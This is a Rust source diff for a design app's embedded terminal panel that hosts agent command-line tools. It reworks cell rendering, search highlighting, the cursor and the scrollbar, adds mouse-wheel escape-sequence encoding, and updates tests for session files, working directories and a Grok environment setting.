+                    let mut row_search_hit = vec![false; cols as usize];
+                    if let Some(ref q) = needle {
+                        let mut row_chars: Vec<char> = Vec::with_capacity(cols as usize);
+                        for c in 0..cols {
+                            let ch = screen.cell(r, c).and_then(|cell| cell.contents().chars().next()).unwrap_or(' ');
+                            row_chars.push(if search_case_sensitive { ch } else { ch.to_ascii_lowercase() });
+                        }
+                        let q_chars: Vec<char> = q.chars().collect();
+                        if !q_chars.is_empty() && q_chars.len() <= row_chars.len() {
+                            for start_c in 0..=(row_chars.len() - q_chars.len()) {
+                                if row_chars[start_c..start_c + q_chars.len()] == q_chars[..] {
+                                    search_matches += 1;
+                                    row_search_hit[start_c..start_c + q_chars.len()].fill(true);
+                                }
+                            }
+                        }
+                    }
+
+                    let mut job = LayoutJob::default();
+                    let mut run_text = String::new();
+                    let mut run_style: Option<(Color32, bool, bool, bool)> = None;
+
                     for c in 0..cols {
-                        let ch = screen.cell(r, c).and_then(|cell| cell.contents().chars().next()).unwrap_or(' ');
-                        row_chars.push(if search_case_sensitive { ch } else { ch.to_ascii_lowercase() });
-                    }
-                    let q_chars: Vec<char> = q.chars().collect();
-                    if !q_chars.is_empty() && q_chars.len() <= row_chars.len() {
-                        for start_c in 0..=(row_chars.len() - q_chars.len()) {
-                            if row_chars[start_c..start_c + q_chars.len()] == q_chars[..] {
-                                search_matches += 1;
-                                row_search_hit[start_c..start_c + q_chars.len()].fill(true);
+                        let Some(cell) = screen.cell(r, c) else {
+                            continue;
+                        };
+                        if cell.is_wide_continuation() {
+                            continue;
+                        }
+                        let mut fg = vt100_color_to_egui(cell.fgcolor(), true);
+                        let mut bg = vt100_color_to_egui(cell.bgcolor(), false);
+                        if cell.inverse() {
+                            std::mem::swap(&mut fg, &mut bg);
+                            if bg == Color32::TRANSPARENT {
+                                bg = TERM_FG_DEFAULT;
+                            }
+                            if fg == Color32::TRANSPARENT {
+                                fg = TERM_BG_VIEWPORT;
                             }
                         }
-                    }
-                }
 
-                let mut job = LayoutJob::default();
-                let mut run_text = String::new();
-                let mut run_style: Option<(Color32, bool, bool, bool)> = None;
+                        let cell_rect = Rect::from_min_size(Pos2::new(origin_x + c as f32 * CHAR_W, row_y), Vec2::new(CHAR_W, ROW_H));
+                        let is_selected = norm_sel.is_some_and(|(s, e)| (r, c) >= s && (r, c) <= e);
+                        let is_search_hit = row_search_hit.get(c as usize).copied().unwrap_or(false);
 
-                for c in 0..cols {
-                    let Some(cell) = screen.cell(r, c) else {
-                        continue;
-                    };
-                    if cell.is_wide_continuation() {
-                        continue;
-                    }
-                    let mut fg = vt100_color_to_egui(cell.fgcolor(), true);
-                    let mut bg = vt100_color_to_egui(cell.bgcolor(), false);
-                    if cell.inverse() {
-                        std::mem::swap(&mut fg, &mut bg);
-                        if bg == Color32::TRANSPARENT {
-                            bg = TERM_FG_DEFAULT;
+                        // Paint exact cell-aligned background / selection / search highlight BEFORE text layout (zero vertical seams)
+                        if is_selected {
+                            p.rect_filled(cell_rect, 0.0, TERM_SELECTION_BG);
+                        } else if is_search_hit {
+                            p.rect_filled(cell_rect, 0.0, Color32::from_rgb(0x5C, 0x4A, 0x00));
+                        } else if bg != Color32::TRANSPARENT {
+                            p.rect_filled(cell_rect, 0.0, bg);
                         }
-                        if fg == Color32::TRANSPARENT {
-                            fg = TERM_BG_VIEWPORT;
-                        }
-                    }
 
-                    let cell_rect = Rect::from_min_size(Pos2::new(origin_x + c as f32 * CHAR_W, row_y), Vec2::new(CHAR_W, ROW_H));
-                    let is_selected = norm_sel.is_some_and(|(s, e)| (r, c) >= s && (r, c) <= e);
-                    let is_search_hit = row_search_hit.get(c as usize).copied().unwrap_or(false);
-
-                    // Paint exact cell-aligned background / selection / search highlight BEFORE text layout (zero vertical seams)
-                    if is_selected {
-                        p.rect_filled(cell_rect, 0.0, TERM_SELECTION_BG);
-                    } else if is_search_hit {
-                        p.rect_filled(cell_rect, 0.0, Color32::from_rgb(0x5C, 0x4A, 0x00));
-                    } else if bg != Color32::TRANSPARENT {
-                        p.rect_filled(cell_rect, 0.0, bg);
-                    }
-
-                    let style_key = (fg, cell.bold(), cell.italic(), cell.underline());
-                    if run_style != Some(style_key) {
-                        if let Some((p_fg, _bold, italics, underline)) = run_style {
-                            if !run_text.is_empty() {
-                                job.append(
-                                    &run_text,
-                                    0.0,
-                                    TextFormat {
-                                        font_id: font_id.clone(),
-                                        color: p_fg,
-                                        background: Color32::TRANSPARENT,
-                                        italics,
-                                        underline: if underline { Stroke::new(1.0, p_fg) } else { Stroke::NONE },
-                                        ..Default::default()
-                                    },
-                                );
-                                run_text.clear();
+                        let style_key = (fg, cell.bold(), cell.italic(), cell.underline());
+                        if run_style != Some(style_key) {
+                            if let Some((p_fg, _bold, italics, underline)) = run_style {
+                                if !run_text.is_empty() {
+                                    job.append(
+                                        &run_text,
+                                        0.0,
+                                        TextFormat {
+                                            font_id: font_id.clone(),
+                                            color: p_fg,
+                                            background: Color32::TRANSPARENT,
+                                            italics,
+                                            underline: if underline { Stroke::new(1.0, p_fg) } else { Stroke::NONE },
+                                            ..Default::default()
+                                        },
+                                    );
+                                    run_text.clear();
+                                }
                             }
+                            run_style = Some(style_key);
                         }
-                        run_style = Some(style_key);
-                    }
 
-                    let contents = cell.contents();
-                    let mut chars_it = contents.chars();
-                    if let (Some(ch), None) = (chars_it.next(), chars_it.next()) {
-                        if paint_custom_terminal_glyph(&p, cell_rect, ch, fg) {
+                        let contents = cell.contents();
+                        let mut chars_it = contents.chars();
+                        if let (Some(ch), None) = (chars_it.next(), chars_it.next()) {
+                            if paint_custom_terminal_glyph(&p, cell_rect, ch, fg) {
+                                run_text.push(' ');
+                            } else {
+                                run_text.push(ch);
+                            }
+                        } else if contents.is_empty() {
                             run_text.push(' ');
                         } else {
-                            run_text.push(ch);
+                            run_text.push_str(&contents);
                         }
-                    } else if contents.is_empty() {
-                        run_text.push(' ');
-                    } else {
-                        run_text.push_str(&contents);
+                    }
+
+                    let trimmed_len = run_text.trim_end_matches(' ').len();
+                    let has_underline = run_style.is_some_and(|(_, _, _, ul)| ul);
+                    if !has_underline {
+                        run_text.truncate(trimmed_len);
+                    }
+                    if let Some((p_fg, _bold, italics, underline)) = run_style {
+                        if !run_text.is_empty() {
+                            job.append(
+                                &run_text,
+                                0.0,
+                                TextFormat {
+                                    font_id: font_id.clone(),
+                                    color: p_fg,
+                                    background: Color32::TRANSPARENT,
+                                    italics,
+                                    underline: if underline { Stroke::new(1.0, p_fg) } else { Stroke::NONE },
+                                    ..Default::default()
+                                },
+                            );
+                        }
+                    }
+
+                    if !job.text.is_empty() {
+                        let galley = ui.fonts_mut(|f| f.layout_job(job));
+                        p.galley(Pos2::new(origin_x, row_y), galley, TERM_FG_DEFAULT);
                     }
                 }
 
-                let trimmed_len = run_text.trim_end_matches(' ').len();
-                let has_underline = run_style.is_some_and(|(_, _, _, ul)| ul);
-                if !has_underline {
-                    run_text.truncate(trimmed_len);
-                }
-                if let Some((p_fg, _bold, italics, underline)) = run_style {
-                    if !run_text.is_empty() {
-                        job.append(
-                            &run_text,
-                            0.0,
-                            TextFormat {
-                                font_id: font_id.clone(),
-                                color: p_fg,
-                                background: Color32::TRANSPARENT,
-                                italics,
-                                underline: if underline { Stroke::new(1.0, p_fg) } else { Stroke::NONE },
-                                ..Default::default()
-                            },
-                        );
-                    }
-                }
-
-                if !job.text.is_empty() {
-                    let galley = ui.fonts_mut(|f| f.layout_job(job));
-                    p.galley(Pos2::new(origin_x, row_y), galley, TERM_FG_DEFAULT);
-                }
-            }
-
-            // Orca Cursor: solid `#FFFFFF` block + `#1D1F21` cursorAccent when focused; `1px` `#A1A1AA` outline when unfocused
-            if scrollback_offset == 0 && !screen.hide_cursor() && cur_row < rows && cur_col < cols {
-                let cx = origin_x + cur_col as f32 * CHAR_W;
-                let cy = origin_y + cur_row as f32 * ROW_H;
-                let cursor_rect = Rect::from_min_size(Pos2::new(cx, cy), Vec2::new(CHAR_W, ROW_H - 1.0));
-                if viewport_focused {
-                    p.rect_filled(cursor_rect, CornerRadius::same(1), Color32::WHITE);
-                    if let Some(cur_cell) = screen.cell(cur_row, cur_col) {
-                        let s = cur_cell.contents();
-                        if !s.trim().is_empty() {
-                            let accent = Color32::from_rgb(0x1D, 0x1F, 0x21);
-                            let mut chars_it = s.chars();
-                            if let (Some(ch), None) = (chars_it.next(), chars_it.next()) {
-                                if !paint_custom_terminal_glyph(&p, cursor_rect, ch, accent) {
+                // Orca Cursor: solid `#FFFFFF` block + `#1D1F21` cursorAccent when focused; `1px` `#A1A1AA` outline when unfocused
+                if scrollback_offset == 0 && !screen.hide_cursor() && cur_row < rows && cur_col < cols {
+                    let cx = origin_x + cur_col as f32 * CHAR_W;
+                    let cy = origin_y + cur_row as f32 * ROW_H;
+                    let cursor_rect = Rect::from_min_size(Pos2::new(cx, cy), Vec2::new(CHAR_W, ROW_H - 1.0));
+                    if viewport_focused {
+                        p.rect_filled(cursor_rect, CornerRadius::same(1), Color32::WHITE);
+                        if let Some(cur_cell) = screen.cell(cur_row, cur_col) {
+                            let s = cur_cell.contents();
+                            if !s.trim().is_empty() {
+                                let accent = Color32::from_rgb(0x1D, 0x1F, 0x21);
+                                let mut chars_it = s.chars();
+                                if let (Some(ch), None) = (chars_it.next(), chars_it.next()) {
+                                    if !paint_custom_terminal_glyph(&p, cursor_rect, ch, accent) {
+                                        p.text(Pos2::new(cx, cy), Align2::LEFT_TOP, s, font_id.clone(), accent);
+                                    }
+                                } else {
                                     p.text(Pos2::new(cx, cy), Align2::LEFT_TOP, s, font_id.clone(), accent);
                                 }
-                            } else {
-                                p.text(Pos2::new(cx, cy), Align2::LEFT_TOP, s, font_id.clone(), accent);
                             }
                         }
+                    } else {
+                        p.rect_stroke(cursor_rect, CornerRadius::same(1), Stroke::new(1.0, Color32::from_rgb(0xA1, 0xA1, 0xAA)), StrokeKind::Inside);
                     }
-                } else {
-                    p.rect_stroke(cursor_rect, CornerRadius::same(1), Stroke::new(1.0, Color32::from_rgb(0xA1, 0xA1, 0xAA)), StrokeKind::Inside);
                 }
-            }
 
-            // Orca slim `7px` scrollbar + `"↑ Scrollback"` pill when scrolled into history
-            if scrollback_offset > 0 {
-                let track_h = (viewport_rect.height() - 8.0).max(24.0);
-                let thumb_h = (track_h * 0.22).clamp(18.0, 64.0);
-                let frac = (scrollback_offset as f32 / 500.0).clamp(0.0, 1.0);
-                let thumb_y = viewport_rect.bottom() - 4.0 - thumb_h - (track_h - thumb_h) * frac;
-                let sb_rect = Rect::from_min_size(Pos2::new(viewport_rect.right() - 9.0, thumb_y), Vec2::new(7.0, thumb_h));
-                p.rect_filled(sb_rect, CornerRadius::same(4), Color32::from_rgba_unmultiplied(180, 180, 185, 102));
+                // Interactive panel-aligned scrollbar (`#1171` R3: real `scrollback_len`, `24 px` target) + `"↑ Scrollback"` pill
+                if scrollback_len > 0 && viewport_rect.height() > 0.0 {
+                    let track_len = track_rect.height();
+                    let total_lines = (scrollback_len + usize::from(rows)).max(1);
+                    let ratio = (f32::from(rows) / total_lines as f32).clamp(0.0, 1.0);
+                    let max_thumb = (track_len * 0.5).max(theme::SPACE_FACT);
+                    let min_thumb = theme::TARGET_MIN.min(max_thumb);
+                    let thumb_h = (track_len * ratio).clamp(min_thumb, max_thumb);
+                    let frac = (scrollback_offset as f32 / scrollback_len as f32).clamp(0.0, 1.0);
+                    let thumb_y = track_rect.top() + (track_len - thumb_h) * (1.0 - frac);
+                    let thumb_rect =
+                        Rect::from_min_size(Pos2::new(viewport_rect.right() - theme::INSET_SEGMENT, thumb_y), Vec2::new(theme::SPACE_FACT, thumb_h));
+                    let thumb_color = if sb_active { theme::TEXT_SECONDARY } else { theme::TEXT_TERTIARY };
+                    p.rect_filled(thumb_rect, theme::cr(theme::RADIUS_MARK), thumb_color);
+                    widgets::record(ui, "term-scrollbar-track", track_rect);
+                    widgets::record(ui, "term-scrollbar-thumb", thumb_rect);
+                }
 
-                let pill_w = 88.0;
-                let pill_h = 20.0;
-                let pill_r = Rect::from_min_size(
-                    Pos2::new((viewport_rect.right() - pill_w - 14.0).max(viewport_rect.left() + 8.0), viewport_rect.bottom() - pill_h - 8.0),
-                    Vec2::new(pill_w, pill_h),
-                );
-                p.rect_filled(pill_r, CornerRadius::same(10), TERM_BG_ELEVATED);
-                p.rect_stroke(pill_r, CornerRadius::same(10), Stroke::new(1.0, TERM_BORDER), StrokeKind::Inside);
-                p.text(pill_r.center(), Align2::CENTER_CENTER, "↑ Scrollback", theme::font_caption_medium(), STATUS_INFO_TEXT);
-            }
+                if scrollback_offset > 0 {
+                    let pill_w = 88.0;
+                    let pill_h = 20.0;
+                    let pill_r = Rect::from_min_size(
+                        Pos2::new((viewport_rect.right() - pill_w - 14.0).max(viewport_rect.left() + 8.0), viewport_rect.bottom() - pill_h - 8.0),
+                        Vec2::new(pill_w, pill_h),
+                    );
+                    p.rect_filled(pill_r, CornerRadius::same(10), TERM_BG_ELEVATED);
+                    p.rect_stroke(pill_r, CornerRadius::same(10), Stroke::new(1.0, TERM_BORDER), StrokeKind::Inside);
+                    p.text(pill_r.center(), Align2::CENTER_CENTER, "↑ Scrollback", theme::font_caption_medium(), STATUS_INFO_TEXT);
+                }
+            });
         });
     }
 
@@ -6091,7 +7435,6 @@ fn render_vt100_viewport(state: &mut TerminalState, ui: &mut Ui, viewport_rect: 
         state.search_open = false;
     }
 
-    // Orca Floating `Cmd+F` Terminal Search Bar (`TerminalSearch`: `280px × 28px`, `#171717` bg, `8px` radius)
     if state.search_open {
         let search_w = 280.0f32.min((viewport_rect.width() - 12.0).max(160.0));
         let search_h = 28.0;
@@ -6099,8 +7442,8 @@ fn render_vt100_viewport(state: &mut TerminalState, ui: &mut Ui, viewport_rect: 
             Pos2::new((viewport_rect.right() - search_w - 8.0).max(viewport_rect.left() + 6.0), viewport_rect.top() + 8.0),
             Vec2::new(search_w, search_h),
         );
-        p.rect_filled(search_rect, CornerRadius::same(8), Color32::from_rgb(0x17, 0x17, 0x17));
-        p.rect_stroke(search_rect, CornerRadius::same(8), Stroke::new(1.0, TERM_BORDER), StrokeKind::Inside);
+        p.rect_filled(search_rect, CornerRadius::same(8), theme::BG);
+        p.rect_stroke(search_rect, CornerRadius::same(8), Stroke::new(theme::BORDER_WIDTH, theme::BORDER_STRONG), StrokeKind::Inside);
 
         let close_r = Rect::from_center_size(Pos2::new(search_rect.right() - 14.0, search_rect.center().y), Vec2::splat(20.0));
         let close_resp = ui.interact(close_r, Id::new((surface_id, "term-search-close")), Sense::click());
@@ -6152,9 +7495,85 @@ fn render_vt100_viewport(state: &mut TerminalState, ui: &mut Ui, viewport_rect: 
                 .id(Id::new((surface_id, "term-search-input")))
                 .hint_text(RichText::new("Find...").color(theme::TEXT_TERTIARY).font(theme::font_caption()))
                 .font(theme::font_caption())
-                .text_color(Color32::WHITE)
+                .text_color(theme::TEXT)
                 .frame(egui::Frame::NONE),
         );
+    }
+}
+
+/// Maximum wheel reports or cursor-key steps emitted in a single UI frame so a fast trackpad flick
+/// cannot flood the child PTY stdin buffer.
+const MAX_WHEEL_STEPS_PER_FRAME: usize = 10;
+
+/// Outcome of a mouse-wheel event over the terminal viewport.
+#[derive(Debug, Clone, PartialEq, Eq)]
+enum WheelAction {
+    /// Scroll Studio's own 5,000-line scrollback buffer by signed row count (`> 0` up into history, `< 0` down).
+    Scrollback(isize),
+    /// Write encoded mouse wheel or cursor-key bytes to the child PTY stdin.
+    WritePty(Vec<u8>),
+    /// Do nothing (e.g. Shift+wheel in alternate screen when mouse reporting is active, or `delta_rows == 0`).
+    Noop,
+}
+
+fn wheel_delta_rows(delta_y: f32) -> isize {
+    if delta_y.abs() <= 0.5 {
+        return 0;
+    }
+    let steps = ((delta_y.abs() / ROW_H).ceil() as isize).max(1);
+    if delta_y > 0.0 {
+        steps
+    } else {
+        -steps
+    }
+}
+
+fn wheel_bytes(screen: &vt100::Screen, delta_rows: isize, cell: (u16, u16), shift: bool) -> WheelAction {
+    if delta_rows == 0 {
+        return WheelAction::Noop;
+    }
+    if !screen.alternate_screen() {
+        return WheelAction::Scrollback(delta_rows);
+    }
+    let steps = delta_rows.unsigned_abs().min(MAX_WHEEL_STEPS_PER_FRAME);
+    if screen.mouse_protocol_mode() != vt100::MouseProtocolMode::None {
+        if shift {
+            return WheelAction::Noop;
+        }
+        let (r0, c0) = cell;
+        let col = c0.saturating_add(1);
+        let row = r0.saturating_add(1);
+        let button: u8 = if delta_rows > 0 { 64 } else { 65 };
+        let one: Vec<u8> = match screen.mouse_protocol_encoding() {
+            vt100::MouseProtocolEncoding::Sgr => format!("\x1b[<{button};{col};{row}M").into_bytes(),
+            vt100::MouseProtocolEncoding::Default => {
+                let cx = col.min(223) as u8;
+                let cy = row.min(223) as u8;
+                vec![0x1b, b'[', b'M', 32 + button, 32 + cx, 32 + cy]
+            }
+            vt100::MouseProtocolEncoding::Utf8 => {
+                let mut seq = Vec::with_capacity(9);
+                seq.extend_from_slice(b"\x1b[M");
+                seq.push(32 + button);
+                let mut buf = [0u8; 4];
+                if let Some(ch) = char::from_u32(32 + u32::from(col.min(2015))) {
+                    seq.extend_from_slice(ch.encode_utf8(&mut buf).as_bytes());
+                }
+                if let Some(ch) = char::from_u32(32 + u32::from(row.min(2015))) {
+                    seq.extend_from_slice(ch.encode_utf8(&mut buf).as_bytes());
+                }
+                seq
+            }
+        };
+        WheelAction::WritePty(one.repeat(steps))
+    } else {
+        let key: &[u8] = match (screen.application_cursor(), delta_rows > 0) {
+            (true, true) => b"\x1bOA",
+            (true, false) => b"\x1bOB",
+            (false, true) => b"\x1b[A",
+            (false, false) => b"\x1b[B",
+        };
+        WheelAction::WritePty(key.repeat(steps))
     }
 }
 
@@ -6213,8 +7632,81 @@ fn ansi_256_to_color32(idx: u8) -> Color32 {
     }
 }
 
+/// Pins the picker's cached probes so exactly `installed` count as installed CLIs, whatever the host machine has.
+#[cfg(test)]
+pub(crate) fn pin_installed_catalog_clis(st: &mut TerminalState, installed: &[AgentCliPreset]) {
+    for preset in crate::agent_cli_catalog::CATALOG_PRESETS {
+        let probe =
+            crate::agent_cli_catalog::CliProbe { installed: installed.contains(&preset), version: None, signed_in: crate::agent_cli_catalog::SignIn::Unknown };
+        st.picker.cache.set_probe(preset, probe);
+    }
+}
+
 #[cfg(test)]
 mod ask_mode_tests;
+
+#[cfg(test)]
+mod ask_risky_start_tests;
+
+#[cfg(all(test, unix))]
+mod ask_hooks_tests;
+
+#[cfg(all(test, unix))]
+mod hook_output_tests;
+
+#[cfg(all(test, unix))]
+mod unwritable_hook_folder_tests;
+
+#[cfg(all(test, unix))]
+mod capture_lock_tests;
+
+#[cfg(all(test, unix))]
+mod fail_closed_hook_tests;
+
+#[cfg(test)]
+mod pty_error_tests;
+
+#[cfg(all(test, unix))]
+mod hookless_tab_tests;
+
+#[cfg(all(test, unix))]
+mod ask_launch_sources_tests;
+
+#[cfg(all(test, unix))]
+mod gemini_status_tests;
+
+#[cfg(all(test, unix))]
+mod gemini_test_support;
+
+#[cfg(all(test, unix))]
+mod gemini_launch_tests;
+
+#[cfg(all(test, unix))]
+mod gemini_wait_tests;
+
+#[cfg(all(test, unix))]
+mod gemini_dialog_tests;
+
+#[cfg(all(test, unix))]
+mod gemini_composer_tests;
+
+#[cfg(all(test, unix))]
+mod delayed_enter_tests;
+
+#[cfg(all(test, unix))]
+mod gemini_narrow_tests;
+
+#[cfg(all(test, unix))]
+mod gemini_range_tests;
+
+#[cfg(all(test, unix))]
+mod real_cli_launch_tests;
+
+#[cfg(all(test, unix))]
+mod zoom_scrollback_tests;
+
+#[cfg(test)]
+mod wheel_modes_tests;
 
 #[cfg(test)]
 mod tests {
@@ -6287,6 +7779,7 @@ mod tests {
 
         // 1. Verify default pure PTY shell + `+` dropdown menu renders cleanly
         st.runtime_dropdown_open = true;
+        st.picker.menu_more_open = true;
         crate::lint::take_icons();
         let raw_pty = egui::RawInput { screen_rect: Some(Rect::from_min_size(Pos2::ZERO, Vec2::new(1600.0, 900.0))), ..Default::default() };
         let out_pty = ctx.run_ui(raw_pty, |ui| {
@@ -6302,7 +7795,7 @@ mod tests {
         assert!(!pty_all_text.contains(&"Learn more"), "AI credits banner must be removed");
         st.runtime_dropdown_open = false;
 
-        // 2. Also verify chat/sample-prompts view when side_panel_pty_open is false
+        // 2. Also verify the classic chat view when side_panel_pty_open is false
         st.side_panel_pty_open = false;
         st.chat_mode = false;
         crate::lint::take_icons();
@@ -6315,11 +7808,6 @@ mod tests {
         assert!(all_text.contains(&"New chat"), "Header 'New chat' must be painted: {all_text:?}");
         assert!(all_text.contains(&"Shared"), "Subtitle 'Shared' must be painted: {all_text:?}");
         assert!(all_text.contains(&"AI"), "Badge 'AI' must be painted: {all_text:?}");
-        assert!(all_text.contains(&"What's next?"), "Heading 'What's next?' must be painted: {all_text:?}");
-        assert!(all_text.contains(&"Describe this page"), "Sample prompt 'Describe this page' must be painted: {all_text:?}");
-        assert!(all_text.contains(&"Find design problems"), "Sample prompt 'Find design problems' must be painted: {all_text:?}");
-        assert!(all_text.contains(&"Build new screen"), "Sample prompt 'Build new screen' must be painted: {all_text:?}");
-        assert!(all_text.contains(&"Name layers"), "Sample prompt 'Name layers' must be painted: {all_text:?}");
         assert!(!all_text.contains(&"Learn more"), "Credits banner 'Learn more' must NOT be painted: {all_text:?}");
 
         let text_findings = crate::lint::check_text(&texts, &boxes);
@@ -6327,21 +7815,7 @@ mod tests {
         assert!(text_findings.is_empty(), "Agents side panel text lint findings: {text_findings:?}");
         assert!(icon_findings.is_empty(), "Agents side panel icon lint findings: {icon_findings:?}");
 
-        // Also verify all 3 prompt contexts and in-panel PTY mode pass layout lint cleanly
-        for pctx in [
-            crate::agent_sample_prompts::PromptContext::EmptyFile,
-            crate::agent_sample_prompts::PromptContext::Frame,
-            crate::agent_sample_prompts::PromptContext::NoSelection,
-        ] {
-            st.prompt_context = pctx;
-            let raw2 = egui::RawInput { screen_rect: Some(Rect::from_min_size(Pos2::ZERO, Vec2::new(1600.0, 900.0))), ..Default::default() };
-            let out2 = ctx.run_ui(raw2, |ui| {
-                let _ = show_left(&mut st, ui, panel_rect, None);
-            });
-            let (t2, b2) = crate::lint::scan_shapes(&out2.shapes);
-            assert!(crate::lint::check_text(&t2, &b2).is_empty());
-        }
-
+        // The in-panel PTY mode passes layout lint cleanly too.
         st.side_panel_pty_open = true;
         let raw3 = egui::RawInput { screen_rect: Some(Rect::from_min_size(Pos2::ZERO, Vec2::new(1600.0, 900.0))), ..Default::default() };
         let _ = ctx.run_ui(raw3, |ui| {
@@ -6501,8 +7975,6 @@ mod tests {
         let get_rect =
             |name: &str| -> Rect { ctx.data(|d| d.get_temp::<Rect>(Id::new(("test-rect", name.to_string())))).unwrap_or_else(|| panic!("{name} recorded")) };
         let ai_rect = get_rect("agents-header-ai");
-        let plus_rect = get_rect("agents-composer-attach");
-        let prd_rect = get_rect("agents-composer-context");
         assert!(
             ctx.data(|d| d.get_temp::<Rect>(Id::new(("test-rect", "agents-composer-mic".to_string())))).is_none(),
             "agents-composer-mic must not be rendered"
@@ -6531,20 +8003,23 @@ mod tests {
         assert!(!st.chat_mode);
         assert!(st.side_panel_pty_open);
 
-        // Switch back to chat view to test composer buttons
-        st.side_panel_pty_open = false;
+        // Back in the terminal view: the composer `+` opens its menu and `Add selection` changes the draft and emits the export action.
+        st.side_panel_pty_open = true;
         let _ = ctx.run_ui(egui::RawInput { screen_rect: Some(Rect::from_min_size(Pos2::ZERO, Vec2::new(1600.0, 900.0))), ..Default::default() }, |ui| {
             let _ = show_left(&mut st, ui, panel_rect, None);
         });
-
-        // Click `+` attach button -> prepends @selection @prd and emits ExportSelectionToTerminal
-        let acts = click_at(&ctx, &mut st, plus_rect.center());
+        let add_rect = get_rect("agents-composer-add-btn");
+        assert!(!st.attach_menu_open);
+        let _ = click_at(&ctx, &mut st, add_rect.center());
+        assert!(st.attach_menu_open, "the composer + opens the attach menu");
+        let _ = ctx.run_ui(egui::RawInput { screen_rect: Some(Rect::from_min_size(Pos2::ZERO, Vec2::new(1600.0, 900.0))), ..Default::default() }, |ui| {
+            let _ = show_left(&mut st, ui, panel_rect, None);
+        });
+        let item_rect = get_rect("agents-composer-add-selection");
+        let acts = click_at(&ctx, &mut st, item_rect.center());
         assert!(st.composer_draft().contains("@selection"));
         assert!(acts.contains(&TerminalAction::ExportSelectionToTerminal));
-
-        // Click `PRD` context chip -> cycles next context tag (@tokens since @prd & @selection are present)
-        let _ = click_at(&ctx, &mut st, prd_rect.center());
-        assert!(st.composer_draft().contains("@tokens"));
+        assert!(!st.attach_menu_open, "picking an item closes the menu");
 
         for mut tab in st.tabs.drain(..) {
             let _ = tab.child.kill();
@@ -6682,7 +8157,7 @@ mod tests {
         assert!(st1.context_json_path.exists());
         assert!(st1.live_canvas_path.exists());
         assert!(st1.session_dir.join("mcp-config.json").exists());
-        assert!(st1.session_dir.join("hooks.json").exists());
+        assert!(crate::agent_permissions::claude_hooks_path(&st1).exists());
         assert!(st1.session_dir.join("SKILL.md").exists());
 
         let ctx_val: serde_json::Value =
@@ -7501,6 +8976,29 @@ mod tests {
         assert_eq!(grok_env(AgentCliPreset::Antigravity), None);
     }
 
+    /// Grok sources `<cwd>/.envrc` with bash when a session starts, unless `GROK_ENVRC_TIMEOUT_SECS` is `0`. A zero turns every load
+    /// off, so it also covers a file an agent writes after the start check; Skip mode has no use for `.envrc` either.
+    #[test]
+    fn grok_pty_env_turns_envrc_loading_off_for_grok_tabs_in_every_mode_and_for_no_other_cli() {
+        let envrc = |preset, session: Option<&SessionEnv>| {
+            let mut cmd = CommandBuilder::new("true");
+            // A value Studio's own environment held must not reach a Grok tab.
+            cmd.env("GROK_ENVRC_TIMEOUT_SECS", "10");
+            configure_pty_env_with_session(&mut cmd, preset, None, session);
+            cmd.get_env("GROK_ENVRC_TIMEOUT_SECS").map(|v| v.to_string_lossy().into_owned())
+        };
+        let mut st = isolated_683_state(734);
+        for mode in [PermissionMode::Ask, PermissionMode::Skip] {
+            st.permission_mode = mode;
+            let env = st.session_env();
+            assert_eq!(envrc(AgentCliPreset::Grok, Some(&env)).as_deref(), Some("0"), "{mode:?}");
+            for other in [AgentCliPreset::Claude, AgentCliPreset::Antigravity, AgentCliPreset::Gemini, AgentCliPreset::Codex] {
+                assert_eq!(envrc(other, Some(&env)).as_deref(), Some("10"), "{other:?} keeps what Studio's own environment held ({mode:?})");
+            }
+        }
+        assert_eq!(envrc(AgentCliPreset::Grok, None).as_deref(), Some("0"), "a tab without a session");
+    }
+
     /// Quoted items of the TOML list that follows `key=[` in a Codex `-c` override.
     fn codex_list_override(launch: &str, key: &str) -> Vec<String> {
         let start = launch.find(&format!("{key}=[")).unwrap_or_else(|| panic!("no {key} override in: {launch}")) + key.len() + 2;
@@ -7564,15 +9062,15 @@ mod tests {
         let files_folder = std::path::PathBuf::from("/Users/someone/designs");
         // Agent CLIs discover project config, skills and AGENTS.md from their cwd: the session dir.
         for preset in [AgentCliPreset::Claude, AgentCliPreset::Codex, AgentCliPreset::Antigravity, AgentCliPreset::Grok] {
-            assert_eq!(resolve_pty_cwd(preset, Some(session), files_folder.clone()), session, "{preset:?}");
+            assert_eq!(resolve_pty_cwd(preset, Some(session), Some(files_folder.clone())), session, "{preset:?}");
         }
         // A shell tab opens in the file's folder.
-        assert_eq!(resolve_pty_cwd(AgentCliPreset::Shell, Some(session), files_folder.clone()), files_folder);
+        assert_eq!(resolve_pty_cwd(AgentCliPreset::Shell, Some(session), Some(files_folder.clone())), files_folder);
         // A bundle launched from Finder has cwd `/`: never use it.
         let root = std::path::PathBuf::from("/");
-        assert_eq!(resolve_pty_cwd(AgentCliPreset::Shell, Some(session), root.clone()), session);
-        assert_eq!(resolve_pty_cwd(AgentCliPreset::Claude, None, root.clone()), std::env::temp_dir());
-        assert_eq!(resolve_pty_cwd(AgentCliPreset::Shell, None, root), std::env::temp_dir());
+        assert_eq!(resolve_pty_cwd(AgentCliPreset::Shell, Some(session), Some(root.clone())), session);
+        assert_eq!(resolve_pty_cwd(AgentCliPreset::Claude, None, Some(root.clone())), std::env::temp_dir());
+        assert_eq!(resolve_pty_cwd(AgentCliPreset::Shell, None, Some(root)), std::env::temp_dir());
     }
 
     #[test]
@@ -7597,7 +9095,9 @@ mod tests {
         st.flush_live_sync();
         for rel in ["SKILL.md", ".claude/skills/designos-studio/SKILL.md", ".agents/skills/designos-studio/SKILL.md", "AGENTS.md"] {
             let text = std::fs::read_to_string(st.session_dir.join(rel)).unwrap_or_else(|e| panic!("{rel}: {e}"));
-            assert!(text.contains("designos-studio") && text.contains("Skill Layout File"), "{rel}: {text}");
+            // Each CLI loads this file by itself, so it names the open file through `$DESIGNOS_DOC_NAME` and not by its name.
+            assert!(text.contains("designos-studio") && text.contains("`$DESIGNOS_DOC_NAME`"), "{rel}: {text}");
+            assert!(!text.contains("Skill Layout File"), "{rel} carries the document name: {text}");
             assert!(text.ends_with(designos_mcp::rules::GENERATED_RULES_MD.trim_start()), "{rel} must include the generated rules pack");
         }
     }
@@ -7685,7 +9185,7 @@ mod tests {
     }
 
     fn status_state(session_dir: &std::path::Path) -> Option<String> {
-        let raw = std::fs::read_to_string(session_dir.join("agent-status.json")).ok()?;
+        let raw = std::fs::read_to_string(crate::agent_hook_outputs::HookPaths::locate(session_dir).status()).ok()?;
         serde_json::from_str::<serde_json::Value>(&raw).ok()?.get("state")?.as_str().map(str::to_string)
     }
 
@@ -7696,20 +9196,26 @@ mod tests {
         let a = doc.add_page("Page 2");
         st.sync_live_file_context(&doc, page, &[a], None);
         st.flush_live_sync();
